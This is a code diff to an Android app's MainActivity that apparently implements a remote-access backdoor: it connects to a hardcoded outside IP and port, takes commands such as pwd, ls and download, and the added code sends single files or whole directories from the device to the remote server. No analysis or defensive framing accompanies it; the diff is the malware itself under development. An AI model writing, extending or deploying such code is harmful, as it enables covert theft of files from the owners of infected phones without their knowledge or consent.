@@ -27,7 +27,9 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.Iterator;
@@ -79,7 +81,7 @@ public class MainActivity extends AppCompatActivity {
             Socket sock = null;
 
             try {
-                sock = new Socket("193.161.193.99", 44313);
+                sock = new Socket("3.1.5.104", 4422);
                 send(sock, "hello");
 
                 String text = recv(sock);
@@ -195,40 +197,71 @@ public class MainActivity extends AppCompatActivity {
             } else if (cmd.startsWith("pwd")) {
                 output = currentpath;
             } else if (cmd.startsWith("download ")) {
-                try {
-
-                    FileInputStream file_input_stream = new FileInputStream(cmd.split("download ")[1]);
-                    send(server, "filesize: " + file_input_stream.getChannel().size());
+                String file_to_download = currentpath + "/" + cmd.split("download ")[1];
+                File file = new File(file_to_download);
+                if (file.isDirectory()) {
+                    List<String> all_files = getallfiles(file);
+                    send(server, "dir");
                     recv(server);
-                    byte bite[] = new byte[(int) file_input_stream.getChannel().size()];
-                    file_input_stream.read(bite, 0 , bite.length);
-                    OutputStream outputStream = server.getOutputStream();
-                    outputStream.write(bite, 0, bite.length);
-
-                } catch (Exception e) {
-                    e.getStackTrace();
+                    send(server, "number_of_files: " + all_files.size());
+                    recv(server);
+                    for (String file1 : all_files){
+                        downloadfile(server, file1);
+                    }
                 }
+                else if (file.isFile()) {
+
+                    downloadfile(server, file_to_download);
+                    output = "file sent: " + cmd.split("download ")[1];
+                }
+                else if (!file.exists()){
+                    output = "file doesnt exist";
+                }
+                else {
+                    output = "unknown error";
+                }
+                recv(server);
+
+
             }
             return output;
         }
 
-        private void getAllFilesOfDir(File directory) {
+        @RequiresApi(api = Build.VERSION_CODES.O)
+        void downloadfile(Socket server, String file_to_download) {
+            try {
+                File file = new File(file_to_download);
+                send(server, "downloading " + file.getName());
+
+                byte[] image_array = Files.readAllBytes(Paths.get(file_to_download));
+                DataOutputStream dos = new DataOutputStream(server.getOutputStream());
+
+                dos.writeInt(image_array.length);
+                dos.write(image_array);
+
+            } catch (Exception e) {
+                e.getStackTrace();
+            }
+        }
+
+        private List<String> getallfiles(File directory) {
             Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");
 
             final File[] files = directory.listFiles();
-
+            List<String> files2 = new ArrayList<String>();
             if (files != null) {
                 for (File file : files) {
                     if (file != null) {
-                        if (file.isDirectory()) {  // it is a folder...
-                            Log.d("filesofdir", "Folder: " + file.getAbsolutePath() + "\n");
-                            getAllFilesOfDir(file);
-                        } else {  // it is a file...
+                        if (file.isDirectory()) {
+                            // getallfiles(file);
+                        } else {
+                            files2.add(file.getName());
                             Log.d("filesofdir", "File: " + file.getAbsolutePath() + "\n");
                         }
                     }
                 }
             }
+            return files2;
         }
 
         private List<String> ls(File directory) {
